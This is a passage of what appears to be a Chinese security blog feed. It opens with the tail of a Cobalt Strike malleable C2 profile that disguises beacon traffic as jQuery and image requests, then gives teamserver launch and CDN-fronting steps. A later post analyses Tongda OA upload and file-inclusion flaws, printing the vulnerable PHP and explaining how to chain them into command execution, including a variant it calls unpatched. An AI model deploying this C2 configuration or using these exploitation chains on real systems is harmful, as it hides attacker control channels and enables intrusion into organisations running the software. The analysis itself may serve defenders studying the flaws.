sleeptime &quot;2000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident&#x2F;5.0)&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;image&#x2F;&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;CS上线域名&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*l;q&#x3D;0.8&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http:&#x2F;&#x2F;www.google.com&quot;;</span><br><span class="line">        header &quot;Pragma&quot; &quot;no-cache&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;no-cache&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            append &quot;-.jpg&quot;;</span><br><span class="line">            uri-append;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;img&#x2F;jpg&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx&#x2F;1.10.3 (Ubuntu)&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https-certificate &#123;</span><br><span class="line">    </span><br><span class="line">    ## Option 1) Trusted and Signed Certificate</span><br><span class="line">    ## Use keytool to create a Java Keystore file. </span><br><span class="line">    ## Refer to https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;help-malleable-c2#validssl</span><br><span class="line">    ## or https:&#x2F;&#x2F;github.com&#x2F;killswitch-GUI&#x2F;CobaltStrike-ToolKit&#x2F;blob&#x2F;master&#x2F;HTTPsC2DoneRight.sh</span><br><span class="line">    ## Option 2) Create your own Self-Signed Certificate</span><br><span class="line">    ## Use keytool to import your own self signed certificates</span><br><span class="line"></span><br><span class="line">    set keystore &quot;.&#x2F;spoofdomain.store&quot;;</span><br><span class="line">    set password &quot;mypass&quot;;</span><br><span class="line"></span><br><span class="line">    ## Option 3) Cobalt Strike Self-Signed Certificate</span><br><span class="line">    set C   &quot;US&quot;;</span><br><span class="line">    set CN  &quot;jquery.com&quot;;</span><br><span class="line">    set O   &quot;jQuery&quot;;</span><br><span class="line">    set OU  &quot;Certificate Authority&quot;;</span><br><span class="line">    set validity &quot;365&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;&#x2F;jquery-3.3.1.slim.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;jquery-3.3.2.slim.min.js&quot;;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Server&quot; &quot;NetDNA-cache&#x2F;2.2&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;max-age&#x3D;0, no-cache&quot;;</span><br><span class="line">        header &quot;Pragma&quot; &quot;no-cache&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;javascript; charset&#x3D;utf-8&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)</span><br><span class="line">            # 2nd Line            </span><br><span class="line">            prepend &quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;&#x3D;&#x3D;typeof module&amp;&amp;\&quot;object\&quot;&#x3D;&#x3D;typeof module.exports?module.exports&#x3D;e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!&#x3D;typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n&#x3D;[],r&#x3D;e.document,i&#x3D;Object.getPrototypeOf,o&#x3D;n.slice,a&#x3D;n.concat,s&#x3D;n.push,u&#x3D;n.indexOf,l&#x3D;&#123;&#125;,c&#x3D;l.toString,f&#x3D;l.hasOwnProperty,p&#x3D;f.toString,d&#x3D;p.call(Object),h&#x3D;&#123;&#125;,g&#x3D;function e(t)&#123;return\&quot;function\&quot;&#x3D;&#x3D;typeof t&amp;&amp;\&quot;number\&quot;!&#x3D;typeof t.nodeType&#125;,y&#x3D;function e(t)&#123;return null!&#x3D;t&amp;&amp;t&#x3D;&#x3D;&#x3D;t.window&#125;,v&#x3D;&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o&#x3D;(t&#x3D;t||r).createElement(\&quot;script\&quot;);if(o.text&#x3D;e,n)for(i in v)n[i]&amp;&amp;(o[i]&#x3D;n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null&#x3D;&#x3D;e?e+\&quot;\&quot;:\&quot;object\&quot;&#x3D;&#x3D;typeof e||\&quot;function\&quot;&#x3D;&#x3D;typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b&#x3D;\&quot;3.3.1\&quot;,w&#x3D;function(e,t)&#123;return new w.fn.init(e,t)&#125;,T&#x3D;&#x2F;^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$&#x2F;g;w.fn&#x3D;w.prototype&#x3D;&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null&#x3D;&#x3D;e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t&#x3D;w.merge(this.constructor(),e);return t.prevObject&#x3D;this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t&#x3D;this.length,n&#x3D;+e+(e&lt;0?t:0);return this.pushStack(n&gt;&#x3D;0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend&#x3D;w.fn.extend&#x3D;function()&#123;var e,t,n,r,i,o,a&#x3D;arguments[0]||&#123;&#125;,s&#x3D;1,u&#x3D;arguments.length,l&#x3D;!1;for(\&quot;boolean\&quot;&#x3D;&#x3D;typeof a&amp;&amp;(l&#x3D;a,a&#x3D;arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;&#x3D;&#x3D;typeof a||g(a)||(a&#x3D;&#123;&#125;),s&#x3D;&#x3D;&#x3D;u&amp;&amp;(a&#x3D;this,s--);s&lt;u;s++)if(null!&#x3D;(e&#x3D;arguments[s]))for(t in e)n&#x3D;a[t],a!&#x3D;&#x3D;(r&#x3D;e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i&#x3D;Array.isArray(r)))?(i?(i&#x3D;!1,o&#x3D;n&amp;&amp;Array.isArray(n)?n:[]):o&#x3D;n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]&#x3D;w.extend(l,o,r)):void 0!&#x3D;&#x3D;r&amp;&amp;(a[t]&#x3D;r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(&#x2F;\\D&#x2F;g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!&#x3D;&#x3D;c.call(e))&amp;&amp;(!(t&#x3D;i(e))||\&quot;function\&quot;&#x3D;&#x3D;typeof(n&#x3D;f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)&#x3D;&#x3D;&#x3D;d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r&#x3D;0;if(C(e))&#123;for(n&#x3D;e.length;r&lt;n;r++)if(!1&#x3D;&#x3D;&#x3D;t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1&#x3D;&#x3D;&#x3D;t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null&#x3D;&#x3D;e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n&#x3D;t||[];return null!&#x3D;e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;&#x3D;&#x3D;typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null&#x3D;&#x3D;t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n&#x3D;+t.length,r&#x3D;0,i&#x3D;e.length;r&lt;n;r++)e[i++]&#x3D;t[r];return e.length&#x3D;i,e&#125;,grep:function(e,t,n)&#123;for(var r,i&#x3D;[],o&#x3D;0,a&#x3D;e.length,s&#x3D;!n;o&lt;a;o++)(r&#x3D;!t(e[o],o))!&#x3D;&#x3D;s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o&#x3D;0,s&#x3D;[];if(C(e))for(r&#x3D;e.length;o&lt;r;o++)null!&#x3D;(i&#x3D;t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!&#x3D;(i&#x3D;t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;&#x3D;&#x3D;typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]&#x3D;n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]&#x3D;t.toLowerCase()&#125;);function C(e)&#123;var t&#x3D;!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n&#x3D;x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;&#x3D;&#x3D;&#x3D;n||0&#x3D;&#x3D;&#x3D;t||\&quot;number\&quot;&#x3D;&#x3D;typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E&#x3D;function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b&#x3D;\&quot;sizzle\&quot;+1*new Date,w&#x3D;e.document,T&#x3D;0,C&#x3D;0,E&#x3D;ae(),k&#x3D;ae(),S&#x3D;ae(),D&#x3D;function(e,t)&#123;return e&#x3D;&#x3D;&#x3D;t&amp;&amp;(f&#x3D;!0),0&#125;,N&#x3D;&#123;&#125;.hasOwnProperty,A&#x3D;[],j&#x3D;A.pop,q&#x3D;A.push,L&#x3D;A.push,H&#x3D;A.slice,O&#x3D;function(e,t)&#123;for(var n&#x3D;0,r&#x3D;e.length;n&lt;r;n++)if(e[n]&#x3D;&#x3D;&#x3D;t)return n;return-1&#125;,P&#x3D;\&quot;\r&quot;;</span><br><span class="line">            # 1st Line</span><br><span class="line">            prepend &quot;&#x2F;*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org&#x2F;license *&#x2F;&quot;;</span><br><span class="line">            append &quot;\&quot;.(o&#x3D;t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0&#x3D;&#x3D;&#x3D;i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]&#x3D;function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1&#x3D;&#x3D;&#x3D;arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy&#x3D;function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;&#x3D;&#x3D;typeof t&amp;&amp;(n&#x3D;e[t],t&#x3D;e,e&#x3D;n),g(e))return r&#x3D;o.call(arguments,2),i&#x3D;function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid&#x3D;e.guid&#x3D;e.guid||w.guid++,i&#125;,w.holdReady&#x3D;function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray&#x3D;Array.isArray,w.parseJSON&#x3D;JSON.parse,w.nodeName&#x3D;N,w.isFunction&#x3D;g,w.isWindow&#x3D;y,w.camelCase&#x3D;G,w.type&#x3D;x,w.now&#x3D;Date.now,w.isNumeric&#x3D;function(e)&#123;var t&#x3D;w.type(e);return(\&quot;number\&quot;&#x3D;&#x3D;&#x3D;t||\&quot;string\&quot;&#x3D;&#x3D;&#x3D;t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;&#x3D;&#x3D;typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt&#x3D;e.jQuery,Kt&#x3D;e.$;return w.noConflict&#x3D;function(t)&#123;return e.$&#x3D;&#x3D;&#x3D;w&amp;&amp;(e.$&#x3D;Kt),t&amp;&amp;e.jQuery&#x3D;&#x3D;&#x3D;w&amp;&amp;(e.jQuery&#x3D;Jt),w&#125;,t||(e.jQuery&#x3D;e.$&#x3D;w),w&#125;);&quot;;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en-US,en;q&#x3D;0.5&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;CS上线域名&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http:&#x2F;&#x2F;code.jquery.com&#x2F;&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;history&#x2F;&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;CS上线域名&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;octet-stream&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http:&#x2F;&#x2F;www.google.com&quot;;</span><br><span class="line">        header &quot;Pragma&quot; &quot;no-cache&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;no-cache&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            netbiosu;</span><br><span class="line">            append &quot;.asp&quot;;</span><br><span class="line">            uri-append;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;img&#x2F;jpg&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS&#x2F;10.0&quot;;</span><br><span class="line">        header &quot;X-Powered-By&quot; &quot;ASP.NET&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-config &#123;</span><br><span class="line">    set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>C2.profile传到C2服务器上，与CS文件同级目录，命令启动<code>./teamserver C2IP C2PASS ./c2.profile</code></p><p>然后攻击机新建监听器，配置如下</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200715154002213.png" alt="image-20200715154002213"></p><p>上线测试</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200715154104473.png" alt="image-20200715154104473"></p><p>远端地址均为CDN IP</p><h1 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h1><p>CDN需要关闭缓存或开启开发模式</p><p><img src= "/img/loading.gif" data-lazy-src="/images/M394ITIR7RXRU4CBFAV%5D8DV.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透实战</title>
      <link href="/p/1dad.html"/>
      <url>/p/1dad.html</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="55af37772fe795f74ab587877d8210f54dada69f89334f6b0cbe86b8710ddea3"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通达OA任意文件上传+任意文件包含分析</title>
      <link href="/p/7f23.html"/>
      <url>/p/7f23.html</url>
      
        <content type="html"><![CDATA[<p>通达OA官方于2020-03-13发布了安全更新，修复了任意文件上传（2013、2013adv、2015、2016、2017、V11）和文件包含（V11）漏洞，从官网下到源码解密后，简单看了下</p><a id="more"></a><p>直接看主流的2017、V11产品吧，这个系列产品有全版本的变量覆盖问题</p><h1 id="V11、2017任意上传"><a href="#V11、2017任意上传" class="headerlink" title="V11、2017任意上传"></a>V11、2017任意上传</h1><p>以2017为例</p><p>补丁文件路径：<code>2020_A1\2017版\ispirit\im\upload.php</code></p><p>左侧为原始代码，右侧为补丁，可以看到直接将鉴权的文件从<code>else</code>里释放了出来，避免了第5行传入<code>P</code>值导致的权限绕过问题</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200320233755927.png" alt="image-20200320233755927"></p><p>继续往下看任意文件上传的问题</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$TYPE = $_POST[<span class="string">"TYPE"</span>];<span class="comment">//获取TYPE</span></span><br><span class="line">$DEST_UID = $_POST[<span class="string">"DEST_UID"</span>];<span class="comment">//获取DEST_UID（接收方ID）</span></span><br><span class="line">$dataBack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> (($DEST_UID != <span class="string">""</span>) &amp;&amp; !td_verify_ids($ids)) &#123;</span><br><span class="line">$dataBack = <span class="keyword">array</span>(<span class="string">"status"</span> =&gt; <span class="number">0</span>, <span class="string">"content"</span> =&gt; <span class="string">"-ERR "</span> . _(<span class="string">"接收方ID无效"</span>));</span><br><span class="line"><span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里进行了判断是否为空并调用了<code>td_verify_ids</code>函数进行校验</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//td_verify_ids</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">td_verify_ids</span><span class="params">($ids)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> !preg_match(<span class="string">"/[^0-9,]+/"</span>, $ids);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>$ids</code>为<code>get</code>传入的<code>ids</code>值，PHP中没有进行赋值的变量的值为<code>NULL</code>，此时的<code>!preg_match(&quot;/[^0-9,]+/&quot;, $ids)</code>为<code>false</code>而<code>DEST_UID</code>我们可以通过<code>POST</code>操作，因此绕过了这个判断</p><p>继续往下看</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos($DEST_UID, <span class="string">","</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$DEST_UID = intval($DEST_UID);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($DEST_UID == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ($UPLOAD_MODE != <span class="number">2</span>) &#123;</span><br><span class="line">$dataBack = <span class="keyword">array</span>(<span class="string">"status"</span> =&gt; <span class="number">0</span>, <span class="string">"content"</span> =&gt; <span class="string">"-ERR "</span> . _(<span class="string">"接收方ID无效"</span>));</span><br><span class="line"><span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>DEST_UID</code>中存在有<code>,</code>，则通过<code>intval</code>获取整数值；最后当<code>$DEST_UID=0</code>时，<code>UPLOAD_MODE</code>要为2 否接收方ID无效。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$MODULE = <span class="string">"im"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &lt;= count($_FILES)) &#123;</span><br><span class="line"><span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">"1"</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (strlen(urldecode($_FILES[<span class="string">"ATTACHMENT"</span>][<span class="string">"name"</span>])) != strlen($_FILES[<span class="string">"ATTACHMENT"</span>][<span class="string">"name"</span>])) &#123;</span><br><span class="line">$_FILES[<span class="string">"ATTACHMENT"</span>][<span class="string">"name"</span>] = urldecode($_FILES[<span class="string">"ATTACHMENT"</span>][<span class="string">"name"</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ATTACHMENTS = upload(<span class="string">"ATTACHMENT"</span>, $MODULE, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_array($ATTACHMENTS)) &#123;</span><br><span class="line">$dataBack = <span class="keyword">array</span>(<span class="string">"status"</span> =&gt; <span class="number">0</span>, <span class="string">"content"</span> =&gt; <span class="string">"-ERR "</span> . $ATTACHMENTS);</span><br><span class="line"><span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$_FILES</code>全局变量大于等于1的时候(就是有文件上传的时候)，会调用<code>upload</code>方法进行处理，这里的文件上传的参数为<code>ATTACHMENT</code></p><p>跟进<code>upload</code>方法后发现了文件名合法性校验函数<code>is_uploadable</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_uploadable</span><span class="params">($FILE_NAME)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$POS = strrpos($FILE_NAME, <span class="string">"."</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($POS === <span class="keyword">false</span>) &#123;</span><br><span class="line">$EXT_NAME = $FILE_NAME;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (strtolower(substr($FILE_NAME, $POS + <span class="number">1</span>, <span class="number">3</span>)) == <span class="string">"php"</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$EXT_NAME = strtolower(substr($FILE_NAME, $POS + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>strrpos</code> 函数获取<code>.</code>最后一次出现的位置开始到后面的3个字符串，不能为<code>php</code>，基于黑名单的绕过方式有很多，不再赘述。</p><h1 id="V11文件包含"><a href="#V11文件包含" class="headerlink" title="V11文件包含"></a>V11文件包含</h1><p>路径：<code>ispirit\interface\gateway.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/session.php"</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/conn.php"</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/utility_org.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($P != <span class="string">""</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/[^a-z0-9;]+/i"</span>, $P)) &#123;</span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">"非法参数"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_id($P);</span><br><span class="line">session_start();</span><br><span class="line">session_write_close();</span><br><span class="line"><span class="keyword">if</span> (($_SESSION[<span class="string">"LOGIN_USER_ID"</span>] == <span class="string">""</span>) || ($_SESSION[<span class="string">"LOGIN_UID"</span>] == <span class="string">""</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">"RELOGIN"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要不传入P参数即可绕过，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($json) &#123;</span><br><span class="line">$json = stripcslashes($json);</span><br><span class="line">$json = (<span class="keyword">array</span>) json_decode($json);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($json <span class="keyword">as</span> $key =&gt; $val ) &#123;</span><br><span class="line"><span class="keyword">if</span> ($key == <span class="string">"data"</span>) &#123;</span><br><span class="line">$val = (<span class="keyword">array</span>) $val;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($val <span class="keyword">as</span> $keys =&gt; $value ) &#123;</span><br><span class="line">$keys = $value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($key == <span class="string">"url"</span>) &#123;</span><br><span class="line">$url = $val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($url != <span class="string">""</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr($url, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span>) &#123;</span><br><span class="line">$url = substr($url, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((strpos($url, <span class="string">"general/"</span>) !== <span class="keyword">false</span>) || (strpos($url, <span class="string">"ispirit/"</span>) !== <span class="keyword">false</span>) || (strpos($url, <span class="string">"module/"</span>) !== <span class="keyword">false</span>)) &#123;</span><br><span class="line"><span class="keyword">include_once</span> $url;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入<code>json</code>参数，其中包含<code>url</code>参数且<code>url</code>中包含<code>general\</code>、<code>ispirit\</code>、<code>module\</code>其一即可，<code>url</code>通过跨目录方式可以包含通过文件上传漏洞上传的包含恶意代码的文件造成命令执行。</p><h1 id="2017文件包含（官方无补丁，仅有文件上传补丁）"><a href="#2017文件包含（官方无补丁，仅有文件上传补丁）" class="headerlink" title="2017文件包含（官方无补丁，仅有文件上传补丁）"></a>2017文件包含（官方无补丁，仅有文件上传补丁）</h1><p>文件路径：<code>mac\gateway.php</code></p><p>原理同上，但是利用方式更为简单</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/session.php"</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/conn.php"</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/utility_org.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($P != <span class="string">""</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/[^a-z0-9;]+/i"</span>, $P)) &#123;</span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">"非法参数"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_id($P);</span><br><span 